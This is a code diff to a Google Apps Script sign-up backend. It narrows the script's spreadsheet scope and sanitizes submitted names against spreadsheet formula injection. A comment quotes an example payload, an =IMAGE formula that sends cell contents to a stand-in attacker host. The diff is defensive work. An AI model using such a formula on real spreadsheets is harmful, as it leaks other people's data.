@@ -1,3 +1,12 @@
+/**
+ * @OnlyCurrentDoc
+ *
+ * Forces the narrow spreadsheets.currentonly scope. Without this,
+ * Apps Script may grant the full spreadsheets scope, which would let
+ * this script reach every spreadsheet in the owner's Drive. Do not
+ * remove, and note that openById() cannot be used alongside it.
+ */
+
 /* ============================================================
    Santa Cruz Offsite 2026 — sign-up backend.
 
@@ -130,7 +139,11 @@ function truthy_(v) {
 
 function clean_(v, max) {
     const s = String(v == null ? "" : v).trim();
-    return s ? s.slice(0, max) : "";
+    /* setValues turns a leading = into a live formula, so a submitted name
+       of =IMAGE("http://attacker/?x="&A2) would run when the sheet is
+       opened and leak cell contents. Strip it; no real name starts with =. */
+    const safe = s.replace(/^=+/, "");
+    return safe ? safe.slice(0, max) : "";
 }
 
 /* the exact shape app.js renders: { activityId: [person, ...] } */
